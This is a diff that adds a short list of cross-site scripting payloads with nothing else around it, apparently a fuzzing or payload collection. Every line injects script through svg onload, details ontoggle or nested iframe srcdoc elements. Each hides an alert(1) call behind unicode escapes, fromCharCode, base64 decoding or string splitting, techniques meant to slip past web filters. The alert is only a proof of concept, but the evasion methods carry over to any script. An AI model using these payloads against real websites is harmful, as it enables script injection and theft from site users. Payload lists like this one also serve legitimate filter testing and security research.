@@ -1,0 +1,8 @@
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074`+String.fromCharCode(40,49,41))>
+<details open ontoggle=window[atob('YWxlcnQ=')](1)></details>
+<iframe srcdoc="<meta charset='utf-8'><svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')></svg>">
+<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)',0)>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc="<object data='data:text/html,<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'>"></iframe>
+<svg onload=window[atob('YWxlcnQ=')](1)></svg>
+<iframe srcdoc="<svg onload=setTimeout(`window['al'+'ert'](1)`,0)>"></iframe>
